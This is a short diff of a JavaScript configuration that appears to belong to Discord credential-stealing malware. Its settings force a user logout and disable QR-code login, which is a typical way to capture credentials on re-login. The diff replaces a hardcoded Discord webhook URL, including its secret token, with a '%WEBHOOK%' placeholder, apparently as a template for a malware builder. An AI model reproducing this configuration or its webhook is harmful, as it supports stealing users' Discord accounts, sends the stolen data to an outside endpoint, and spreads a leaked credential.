@@ -15,7 +15,7 @@ async function getIp() {
 var config = {
     brand: "west",
 
-    webhook: "https://discord.com/api/webhooks/1089154926124466206/VwwTLSlM6GchW_31vcdhyYguEe7en6aAY3Kc8_y0OChSbTKPaUNnZwALQATDyufZA3jJ",
+    webhook: "%WEBHOOK%",
 
     logout: true,
     disable_qr_code: true,
